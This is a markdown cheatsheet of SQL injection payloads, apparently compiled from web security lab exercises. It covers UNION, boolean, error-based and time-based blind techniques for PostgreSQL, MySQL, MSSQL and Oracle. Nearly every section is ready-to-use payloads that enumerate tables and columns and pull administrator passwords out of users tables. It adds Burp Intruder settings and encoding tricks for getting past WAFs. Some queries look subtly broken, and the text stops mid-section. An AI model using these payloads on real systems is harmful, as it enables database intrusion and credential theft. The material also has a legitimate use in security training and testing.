# SQL Injection UNION Attack Cheatsheet (All Databases)
if cannot try url encode or others encode method,or use hackvector (if xml obfuscate with hex entities)
## **1. Determine Number of Columns**

### **Method 1: ORDER BY**
```sql
-- PostgreSQL, MySQL, MSSQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--

-- Oracle
' ORDER BY 1 FROM DUAL--
' ORDER BY 2 FROM DUAL--
' ORDER BY 3 FROM DUAL--
```

### **Method 2: UNION SELECT NULL**
```sql
-- PostgreSQL, MySQL, MSSQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

-- Oracle
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

---

## **2. Find String-Compatible Columns**

```sql
-- PostgreSQL, MySQL, MSSQL
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Oracle
' UNION SELECT 'a',NULL,NULL FROM DUAL--
' UNION SELECT NULL,'a',NULL FROM DUAL--
' UNION SELECT NULL,NULL,'a' FROM DUAL--
```

---

## **3. Retrieve Database Version**

#### **PostgreSQL:**
```sql
' UNION SELECT version(),NULL,NULL--
' UNION SELECT NULL,version(),NULL--
```

#### **MySQL:**
```sql
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT version(),NULL,NULL--
```

#### **Microsoft SQL Server:**
```sql
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT NULL,@@version,NULL--
```

#### **Oracle:**
```sql
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT NULL,banner FROM v$version--
' UNION SELECT version,NULL FROM v$instance--
```

---

## **4. List All Tables**

#### **PostgreSQL:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT table_name,table_schema FROM information_schema.tables--
```

#### **MySQL:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,table_schema FROM information_schema.tables--
```

#### **Microsoft SQL Server:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
```

#### **Oracle:**
```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT table_name,owner FROM all_tables--
```

---

## **5. List Columns for Specific Table**

#### **PostgreSQL:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--
```

#### **MySQL:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--
```

#### **Microsoft SQL Server:**
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
```

#### **Oracle:**
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'--
```

---

## **6. Extract Data from Tables**

### **When you have multiple string columns:**
```sql
-- PostgreSQL, MySQL, MSSQL
' UNION SELECT username,password FROM users--
' UNION SELECT username,password FROM users WHERE username='administrator'--
```

### **When you only have one string column:**
```sql
-- PostgreSQL
' UNION SELECT NULL,username||':'||password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--

-- MySQL
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
' UNION SELECT NULL,CONCAT_WS(':',username,password) FROM users--

-- MSSQL
' UNION SELECT NULL,username+':'+password FROM users--

-- Oracle
' UNION SELECT NULL,username||':'||password FROM users--
```

---

## **7. Database-Specific Queries**

### **Current Database Name:**
```sql
-- PostgreSQL
' UNION SELECT current_database(),NULL--

-- MySQL
' UNION SELECT database(),NULL--

-- MSSQL
' UNION SELECT db_name(),NULL--

-- Oracle
' UNION SELECT name,NULL FROM v$database--
```

### **Current User:**
```sql
-- PostgreSQL, MySQL
' UNION SELECT user(),NULL--

-- MSSQL
' UNION SELECT user_name(),NULL--
' UNION SELECT suser_name(),NULL--

-- Oracle
' UNION SELECT user,NULL FROM DUAL--
```

---

## **8. Complete Attack Examples**

### **Example 1: Full Attack on PostgreSQL**
```sql
-- Find columns
' UNION SELECT NULL,NULL--

-- Check string columns
' UNION SELECT 'a','b'--

-- Get version
' UNION SELECT version(),NULL--

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- List columns from users table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Get credentials
' UNION SELECT username,password FROM users--
```

### **Example 2: Full Attack on MySQL**
```sql
-- Find columns
' UNION SELECT NULL,NULL--

-- Check string columns
' UNION SELECT 'a','b'--

-- Get version
' UNION SELECT @@version,NULL--

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- List columns from users table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--

-- Get credentials
' UNION SELECT username,password FROM users--
```

### **Example 3: Full Attack on Oracle**
```sql
-- Find columns
' UNION SELECT NULL,NULL FROM DUAL--

-- Check string columns
' UNION SELECT 'a','b' FROM DUAL--

-- Get version
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--

-- List tables
' UNION SELECT table_name,NULL FROM all_tables WHERE owner=(SELECT user FROM DUAL)--

-- List columns from users table
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- Get credentials
' UNION SELECT username,password FROM users--
```

---

## **9. Quick Reference - Database Detection**

```sql
-- If this works, it's PostgreSQL/MySQL/MSSQL:
' UNION SELECT NULL--

-- If you need this, it's Oracle:
' UNION SELECT NULL FROM DUAL--

-- If you see these errors:
-- PostgreSQL: "column does not exist"
-- MySQL: "Unknown column"
-- MSSQL: "Invalid column name"
-- Oracle: "invalid identifier"
```

---

## **10. Important Notes**

- **Oracle**: Table names are **UPPERCASE** by default
- **MySQL**: Database name is case-sensitive on Linux
- **PostgreSQL**: Use `'public'` schema for most applications
- **MSSQL**: May need to handle XML output for some queries

## **Payload Encoding for HTTP Requests**
```
Space: + or %20
Single quote: %27
Double quote: %22
Comment: --+ or %23
```

This cheatsheet covers all major databases for UNION-based SQL injection attacks!

# COMPLETE BLIND SQL INJECTION GUIDE

## **Initial Detection Methods**

### **1. Confirm Blind SQLi Vulnerability**

#### **Boolean-Based Detection:**
```sql
Cookie: TrackingId=xyz' AND '1'='1  -- Returns welcome message
Cookie: TrackingId=xyz' AND '1'='2  -- No welcome message (confirms blind SQLi)
```

#### **Error-Based Detection:**
```sql
-- Test for errors
TrackingId=xyz'  -- Check if error appears
TrackingId=xyz'||(SELECT '')||'  -- Test concatenation

-- Database-specific error testing
TrackingId=xyz'||(SELECT '' FROM dual)||'  -- Oracle test
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'  -- Should cause error
```

---

## **Database Identification**

### **Version Detection (Boolean-Based):**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT version()) IS NOT NULL--

-- MySQL / Microsoft SQL Server  
TrackingId=xyz' AND (SELECT @@version) IS NOT NULL--

-- Oracle
TrackingId=xyz' AND (SELECT * FROM v$version) IS NOT NULL--
```

### **Version Detection (Error-Based):**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT version()) IS NOT NULL THEN TO_CHAR(1/0) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT @@version) IS NOT NULL THEN CAST(1/0 AS UNSIGNED) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT @@version) IS NOT NULL THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

---

## **Table & Column Verification**

### **Boolean-Based Verification:**
```sql
-- Check if users table exists
TrackingId=xyz' AND (SELECT COUNT(*) FROM users) > 0--
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--

-- Check for specific user
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
TrackingId=xyz' AND (SELECT username FROM users WHERE ROWNUM=1)='administrator'--
```

### **Error-Based Verification:**
PostgreSQL:
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN CAST(1/0 AS TEXT) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN CAST(1/0 AS TEXT) ELSE '' END)||'
MySQL:
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'
Microsoft SQL Server:
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'
Oracle (Your Original):
sql
-- Check if users table exists
TrackingId=xyz'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'

-- Check for specific user
TrackingId=xyz'||(SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'


---

## **COMPLETE ATTACK STEPS**

### **Step 1: Find Database Name (Character by Character)**

#### **Boolean-Based:**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT SUBSTRING(current_database(),§1§,1))='§a§'--

-- MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(database(),§1§,1))='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(db_name(),§1§,1))='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(global_name,§1§,1) FROM global_name WHERE rownum=1)='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(current_database(),§1§,1))='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(database(),§1§,1))='§a§' THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(db_name(),§1§,1))='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(global_name,§1§,1) FROM global_name WHERE rownum=1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20 and a-z,0-9,_

---

### **Step 2: Find All Tables (Character by Character)**

#### **Boolean-Based:**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §2§)='§a§'--

-- MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §2§)='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_catalog=db_name() LIMIT 1 OFFSET §2§)='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(table_name,§1§,1) FROM all_tables WHERE owner=(SELECT user FROM dual) AND rownum=1 OFFSET §2§)='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §2§)='§a§' THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_catalog=db_name() LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(table_name,§1§,1) FROM all_tables WHERE owner=(SELECT user FROM dual) AND rownum=1 OFFSET §2§)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 3: Find Columns for Specific Table**

#### **Boolean-Based:**
```sql
-- PostgreSQL
TrackingId=xyz' AND (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§'--

-- MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 1 OFFSET §2§)='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(column_name,§1§,1) FROM all_tab_columns WHERE table_name='USERS' AND rownum=1 OFFSET §2§)='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 1 OFFSET §2§)='§a§' THEN EXTRACTVALUE(1,CONCAT(0x7e,version())) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §2§)='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(column_name,§1§,1) FROM all_tab_columns WHERE table_name='USERS' AND rownum=1 OFFSET §2§)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 4: Find Password Length**

#### **Boolean-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT LEN(password) FROM users WHERE username='administrator')=§1§--

-- Oracle
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§--
```

#### **Error-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§ THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT LEN(password) FROM users WHERE username='administrator')=§1§ THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§ THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Sniper with numbers 1-50

---

### **Step 5: Extract Password Character by Character**

#### **Boolean-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--

-- Microsoft SQL Server
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--

-- Oracle
TrackingId=xyz' AND (SELECT SUBSTR(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```

#### **Error-Based:**
```sql
-- PostgreSQL & MySQL
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' THEN CAST(1/0 AS TEXT) ELSE '' END)||'

-- Microsoft SQL Server
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' THEN CAST(1/0 AS VARCHAR) ELSE '' END)||'

-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SELECT SUBSTR(password,§1§,1) FROM users WHERE username='administrator')='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)||'
```

**Burp Setup:** Cluster bomb with positions 1-20 and a-z,0-9

---

## **Comparison Operators for Blind SQLi**

### **Boolean-Based Character Comparison:**
```sql
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm'--
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) < 't'--
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) = 's'--
```

### **Error-Based Character Comparison:**
```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm' THEN TO_CHAR(1/0) ELSE '' END)||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) < 't' THEN TO_CHAR(1/0) ELSE '' END)||'
```

---

## **Burp Intruder Optimization**

### **For Boolean-Based:**
- **Grep Match:** "Welcome back" or success indicator
- **Attack Type:** Cluster bomb
- **Payloads:** 
  - Numbers: 1-20 (positions)
  - Numbers: 0-10 (offsets) 
  - Characters: a-z, 0-9, _

### **For Error-Based:**
- **Filter:** HTTP 500 status codes
- **Grep Match:** Specific error messages
- **Attack Type:** Cluster bomb
- **Payloads:** Same as above

### **Detection Methods:**
1. **Boolean:** Look for different response content/length
2. **Error:** Look for HTTP 500 errors or error messages
3. **Time-Based:** Add delays for time-based detection

---

## **Quick Reference - Database Functions**

| Operation | PostgreSQL | MySQL | MSSQL | Oracle |
|-----------|------------|-------|-------|--------|
| **Substring** | SUBSTRING() | SUBSTRING() | SUBSTRING() | SUBSTR() |
| **Length** | LENGTH() | LENGTH() | LEN() | LENGTH() |
| **Concatenation** | `||` | CONCAT() | `+` | `||` |
| **Error Trigger** | CAST(1/0 AS TEXT) | EXTRACTVALUE() | CAST(1/0 AS VARCHAR) | TO_CHAR(1/0) |
| **Current DB** | current_database() | database() | db_name() | global_name |

This comprehensive guide now includes BOTH boolean-based and error-based blind SQL injection methods for all major databases!

## visible error based sql injection and for char number limiting case
TrackingId=ogAZZfxtOKUELbuJ'                                                      -->error msg unclosed single quote means vulnerable to sql injec
TrackingId=ogAZZfxtOKUELbuJ'--                                                    -->comfirm no error
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--                        -->error msg AND condition must be a boolean expression.
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--                      -->comfirm no error add up to que for useful info 
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--    -->error msg Notice that your query now appears to be truncated due to a character limit.  so remove the trackID
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--                    -->error msg because it unexpectedly returned more than one row.
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--            -->error msg now leaks first username from users table ERROR: invalid input syntax for type integer: "administrator"
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--            -->Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:

Log in as administrator using the stolen password to solve the lab.

## **Why %3B is Needed & Complete Encoding Guide**

### **Why URL Encoding is Required:**

The semicolon `;` needs to be encoded as `%3B` because:

1. **HTTP Protocol Rules**: Semicolons have special meaning in HTTP headers
2. **Cookie Delimiters**: Cookies use semicolons to separate different cookies
3. **SQL Injection Prevention**: Some WAFs block raw semicolons but miss encoded ones
4. **Parser Confusion**: Raw semicolons might break HTTP parsing

Your payload:
```http
Cookie: TrackingId='%3bSELECT CASE WHEN(1=1)THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
Gets decoded to:
```sql
TrackingId=';SELECT CASE WHEN(1=1)THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

## **Complete Character Encoding Reference**

### **Critical SQL Injection Characters to Encode:**

| Character | URL Encoding | Why Encode |
|-----------|--------------|------------|
| `;` | `%3B` | End of SQL statement |
| `'` | `%27` | String delimiter |
| `"` | `%22` | String delimiter |
| `--` | `%2D%2D` | SQL comment |
| `#` | `%23` | SQL comment |
| `/*` | `%2F%2A` | Start comment |
| `*/` | `%2A%2F` | End comment |
| `=` | `%3D` | Comparison operator |
| ` ` (space) | `%20` or `+` | Space character |
| `(` | `%28` | Parentheses |
| `)` | `%29` | Parentheses |
| `|` | `%7C` | Concatenation |
| `&` | `%26` | AND operator |
| `,` | `%2C` | Parameter separator |

# Time-Based Blind SQL Injection: Unknown Schema Master Guide
## Complete Database Schema Discovery Across All Major Databases

---

## **Overview**

When table and column names are unknown, we must first extract the database schema using time-based blind SQL injection. This involves systematically querying the database's metadata tables.

## **Database-Specific Information Schema**

| Database | Table Metadata | Column Metadata |
|----------|----------------|-----------------|
| **PostgreSQL** | `information_schema.tables` | `information_schema.columns` |
| **MySQL** | `information_schema.tables` | `information_schema.columns` |
| **Microsoft SQL Server** | `information_schema.tables` | `information_schema.columns` |
| **Oracle** | `all_tables` | `all_tab_columns` |

---

## **Step 1: Database Fingerprinting**

### **Identify Database Type**

#### **PostgreSQL:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING(version(),1,1)='P')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

#### **MySQL:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING(@@version,1,1)='5')+THEN+sleep(10)+ELSE+sleep(0)+END--
```

#### **Microsoft SQL Server:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING(@@version,1,1)='M')+THEN+WAITFOR+DELAY+'0:0:10'+ELSE+WAITFOR+DELAY+'0:0:0'+END--
```

#### **Oracle:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+banner+FROM+v$version+WHERE+rownum=1),1,1)='O')+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+dbms_pipe.receive_message(('a'),0)+END+FROM+dual--
```

---

## **Step 2: Extract Table Names**

### **Find All Tables in Database**

#### **PostgreSQL:**
```sql
-- Extract first table name character by character
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='public'+LIMIT+1+OFFSET+0),1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Extract second table (change OFFSET)
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='public'+LIMIT+1+OFFSET+1),1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

#### **MySQL:**
```sql
-- Extract first table name
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema=database()+LIMIT+1+OFFSET+0),1,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)+END--

-- Extract second table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema=database()+LIMIT+1+OFFSET+1),1,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)+END--
```

#### **Microsoft SQL Server:**
```sql
-- Extract first table name
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+TOP+1+table_name+FROM+information_schema.tables),1,1)='§a§')+THEN+WAITFOR+DELAY+'0:0:10'+ELSE+WAITFOR+DELAY+'0:0:0'+END--

-- Extract second table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+ORDER+BY+table_name+OFFSET+1+ROWS+FETCH+NEXT+1+ROWS+ONLY),1,1)='§a§')+THEN+WAITFOR+DELAY+'0:0:10'+ELSE+WAITFOR+DELAY+'0:0:0'+END--
```

#### **Oracle:**
```sql
-- Extract first table name
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+all_tables+WHERE+rownum=1),1,1)='§a§')+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+dbms_pipe.receive_message(('a'),0)+END+FROM+dual--

-- Extract second table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+all_tables+WHERE+rownum=2),1,1)='§a§')+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+dbms_pipe.receive_message(('a'),0)+END+FROM+dual--
```

**Process:** Extract each table name character by character, then move to next table with OFFSET/ROWNUM.

---

## **Step 3: Find User-Related Tables**

### **Search for Common Table Names**

#### **All Databases - Test Common Names:**
```sql
-- Test if 'users' table exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_name='users'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test if 'admin' table exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_name='admin'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test if 'accounts' table exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_name='accounts'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

**Common Table Names to Test:**
- `users`, `user`, `admin`, `administrators`, `accounts`, `customers`, `members`, `login`, `auth`

---

## **Step 4: Extract Column Names**

### **Find Columns in Target Table**

#### **PostgreSQL:**
```sql
-- Extract first column from 'users' table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+LIMIT+1+OFFSET+0),1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Extract second column
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+LIMIT+1+OFFSET+1),1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

#### **MySQL:**
```sql
-- Extract first column from 'users' table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+AND+table_schema=database()+LIMIT+1+OFFSET+0),1,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)+END--
```

#### **Microsoft SQL Server:**
```sql
-- Extract first column from 'users' table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+TOP+1+column_name+FROM+information_schema.columns+WHERE+table_name='users'),1,1)='§a§')+THEN+WAITFOR+DELAY+'0:0:10'+ELSE+WAITFOR+DELAY+'0:0:0'+END--
```

#### **Oracle:**
```sql
-- Extract first column from 'USERS' table
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+column_name+FROM+all_tab_columns+WHERE+table_name='USERS'+AND+rownum=1),1,1)='§a§')+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+dbms_pipe.receive_message(('a'),0)+END+FROM+dual--
```

**Common Column Names to Look For:**
- `username`, `user`, `email`, `password`, `pass`, `pwd`, `hash`, `admin`, `role`

---

## **Step 5: Verify Administrator User**

### **Check if Administrator Exists**

#### **All Databases (After Finding Table/Columns):**
```sql
-- Test if 'administrator' user exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+users+WHERE+username='administrator'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Alternative if column name is different
